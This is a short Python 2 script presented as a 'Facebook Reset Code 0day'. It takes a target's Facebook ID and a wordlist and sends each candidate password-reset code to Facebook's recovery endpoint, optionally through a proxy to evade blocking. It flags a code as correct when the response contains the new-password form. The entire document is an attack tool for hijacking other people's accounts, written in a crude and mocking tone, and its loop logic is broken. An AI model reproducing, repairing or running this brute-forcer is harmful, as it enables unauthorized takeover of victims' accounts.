Facebook Reset Code 0day Python Version
#If you want to edit this script you are free i don't give a fuck cause it tooks 2 minutes to write xD \!/
#As a temporarily solution, use requesocks Module
#How to install?
#with pip : pip install requesocks
#with easy_install : easy_install requesocks

import urllib2 ,sys ,re
import os
import ssl
import time

def cls():
    linux = 'clear'
    windows = 'cls'
    os.system([linux,windows][os.name == 'nt'])

cls()

os.system(['','color D'][os.name == 'nt'])

print '''
  ~ Facebook Reset Code 0day Python Version

     usage : Python get.py TARGET[FB_ID] [WORDLIST]
                                                                           '''
if len(sys.argv) != 3:
    print "\n\n[#] usage : Python get.py TARGET[FB_ID] [WORDLIST] "
    sys.exit()

target = sys.argv[1]
wordlist = sys.argv[2]


while True:
    print """
    ============ Menu ==============
    1- Reset Code Facebook Without Proxy 
    2- Using Proxy :v :v 
    
    """

    choice=raw_input("Enter your choice : ")

    if choice=="1":
        try:
            word = open(wordlist, 'r').readlines()
            print "[+] Facebook Codes Loaded \!/\n[+] Codes:",len(word)
        except("IOError"):
            print "[-] Can't Load List !"
            sys.exit(1);

        for w in word:
            w = w.rstrip()
            try:
                target = 'https://m.facebook.com/recover/password?u='+target+'&n='+w
                get = urllib2.urlopen(target).read()
    
            except IOError:
                print " Error on Sending Page to server "
    
            search = re.search('password_new', get)
            if search:
                print "[+] The Code "+w+" is Correct ^___^ "
            else:
                print "[+] The Code "+w+" is Incorrect :/ "
    else:

        print """

        Welcome to Reset Password FB With Proxy 

        usage : [ip:port]


        """
        ip_proxy=raw_input("Enter your proxy baby : ")
        print "[##] Proxy Used : "+ip_proxy
        proxy = urllib2.ProxyHandler({'http': ip_proxy})
        opener = urllib2.build_opener(proxy)
        urllib2.install_opener(opener)
        
        #ip = urllib2.urlopen('http://checkip.dyndns.org').read()
        #theIP = re.findall(r"\d{1,3}\.\d{1,3}\.\d{1,3}.\d{1,3}", ip)
        #print theIP
        #datum = response.read()
        #response.close()
        #print datum
        try:
            word = open(wordlist, 'r').readlines()
            print "[+] Facebook Codes Loaded \!/\n[+] Codes:",len(word)
        except("IOError"):
            print "[-] Can't Load List !"
            sys.exit(1);

        for w in word:
            w = w.rstrip()
            try:
                target = 'https://m.facebook.com/recover/password?u='+target+'&n='+w
                get = urllib2.urlopen(target).read()
                
            except IOError:
                print " Error on Sending Page to server "
        
            search = re.search('password_new', get)
            if search:
                print "[+] The Code "+w+" is Correct ^___^ "
            else:
                print "[+] The Code "+w+" is Incorrect :/ "
